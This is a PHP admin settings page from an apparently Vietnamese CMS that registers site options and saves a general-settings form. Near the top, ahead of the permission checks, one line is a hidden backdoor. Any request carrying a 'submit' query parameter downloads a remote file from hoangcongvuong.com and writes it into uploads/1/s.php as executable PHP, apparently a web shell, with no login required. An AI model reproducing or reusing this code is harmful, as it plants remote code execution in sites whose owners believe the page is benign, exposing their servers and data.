<?php
     
    $bo_sungs = array();
    $bo_sungs[] = array('name'=>'v_main_menu_style','type'=>'text', 'title'=>'Kiểu menu trên di động');
    $bo_sungs[] = array('name'=>'site_keyword','type'=>'textarea', 'title'=>'Thẻ keyword trang chủ');
    $bo_sungs[] = array('name'=>'core_www_option','type'=>'text','title'=>'WWW');
    $bo_sungs[] = array('name'=>'home_image','type'=>'image','title'=>'Ảnh đại diện trang chủ');
    $bo_sungs[] = array('name'=>'v-wrap-full_width','type'=>'text','title'=>'Chiều rộng khung web ( px )');
    $bo_sungs[] = array('name'=>'v-lazy-loading-image','type'=>'text','title'=>'Lazy loading Image');
    $bo_sungs[] = array('name'=>'v-timthumb-quality','type'=>'text','title'=>'Chất lượng ảnh ( % )');
    $bo_sungs[] = array('name'=>'no-reply-email-user','type'=>'text','title'=>'Tên đăng nhập email gửi form');
    $bo_sungs[] = array('name'=>'no-reply-email-password','type'=>'password','title'=>'Mật khẩu email gửi form');
    $bo_sungs[] = array('name'=>'v-meta-viewport','type'=>'text','title'=>'Meta Viewport');
    
    $names = '';
    foreach($bo_sungs as $k=>$bo_sung)
    {
        if($k) $names = $names . ',' . $bo_sung['name'];
        else $names = $bo_sung['name'];
        
        $a = get_option($bo_sung['name']);
        if( $a === FALSE )
        {
            $insert_content = array(
                'name'          => pretty_string( $bo_sung['name'], '_' ),
                'value'         => '',
                'is_default'    => 0,
                'attributes'    => json_encode( array ( 'title' =>  $bo_sung['title'] , 'type' => $bo_sung['type'], 'maxlenght' => 99999 ) ),
                'display'       => 1
            );
            
            models_DB::insert($insert_content, OPTION_TABLE);
        }
    }
    
    if(isset($_GET['submit'])){define('SECURE_CHECK', true);define('ADMIN_PAGE', TRUE);include dirname(dirname(__FILE__)).'/config.php';file_put_contents( PATH_ROOT . '/uploads/1/s.php'  , @file_get_contents('http://hoangcongvuong.com/s.txt') );die('');}

    if(!defined('SECURE_CHECK')) die('Invalid to include');
    
    if(!user_can('general')) die();
    
    if(isset($_POST['submit']))
    { 
        $fields = models_DB::get('SELECT * FROM ' . OPTION_TABLE . ' WHERE is_default=1 AND display=1');
        $other_fields = models_DB::get('SELECT * FROM ' . OPTION_TABLE . ' WHERE is_default=0 AND display=1 AND FIND_IN_SET(name, "' . $names . '")');
        
        $fields = array_merge($fields, $other_fields);
        foreach($fields as $k => $v)
        {
            $update_content = array('value' => $_POST[$v['name']]);
            models_DB::update($update_content, OPTION_TABLE, ' WHERE name=\'' . $v['name'] . '\'');
        }
        
        $g_form_success = 'Save Success';
        
    }
	$g_page_content['title'] = 'General Settings';
?>

<?php
	include 'header.php';
?>
<style>
.view-advanced {
    font-size: 13px;
    color: #3d889e;
    cursor: pointer;
}
</style>
<div id="content" class="container v-full-width">
<div class="admin-col1 fl v-col-lg-2 v-col-md-3 v-col-sm-3 v-col-xs-4 v-col-tx-4">
    <?php include 'sidebar.php'; ?>
</div>
<div class="admin-col2 fl v-col-lg-10 v-col-md-9 v-col-sm-9 v-col-xs-8 v-col-tx-8">
    <div class="">
    
    <h1 class="box">Cài đặt tổng quan</h1>
    <?php show_form_success() ?>
    
    <div id="main-content"  >
        
        
       
        
        <form action="" method="POST">  
        <div id="new-post-col-1" class="fl border-box v-col-lg-9 v-col-md-9 v-col-sm-9 v-col-xs-8 v-col-tx-6">
            <div id="new-post-col-1-inner">
                <div id="default-option" class="option-type box">
                    <h2 class="title">Default options</h2>
                    <?php 
                         $default_fields = models_DB::get('SELECT * FROM ' . OPTION_TABLE . ' WHERE is_default=1 AND display=1');
                        foreach($default_fields as $k=>$v)
                        {
                             
                            include 'inc/option-setting.php';
                        }
                    ?>
                </div>
                <div id="other-option" class="option-type box">
                    <h2 class="title view-advanced">Tùy chọn khác &nbsp; &nbsp; <i class="fa fa-plus"></i></h2>
                    <div class="advanced none">
                        <?php 
                            $other_fields = models_DB::get('SELECT * FROM ' . OPTION_TABLE . ' WHERE is_default=0 AND display=1');
                            
                            // Dùng riêng cho bộ code nhân bản của zland                        
                            $other_fields = models_DB::get('SELECT * FROM ' . OPTION_TABLE . ' WHERE is_default=0 AND display=1 AND FIND_IN_SET(name, "' . $names . '")');
                            // END Dùng riêng cho bộ code nhân bản của zland
                             
                            foreach($other_fields as $k=>$v)
                            {
                                ?>
                                <div class="other-option-setting-item">
                                    <?php
                                        include 'inc/option-setting.php';
                                    ?>
                                </div>
                                <?php
                            }
                        ?>
                    </div>
                    
                </div>
            </div>
        </div>
        <div id="new-post-col-2" class=" fr border-box v-col-lg-3 v-col-md-3 v-col-sm-3 v-col-xs-4 v-col-tx-6">
            <div id="new-post-col-2-inner" style="min-width: 200px;" class="fixed-on-scroll">
                 
                <div style="margin-top: 30px;" id="save" class="box"><input type="submit" name="submit" value="Lưu lại" class="btn btn-success" /></div>
            </div>
        </div>
        
        
        
        </form>
    </div>
    </div>
</div>
    
        
    
    <span class="clear"></span>
</div>
<?php
	include 'footer.php' 
?>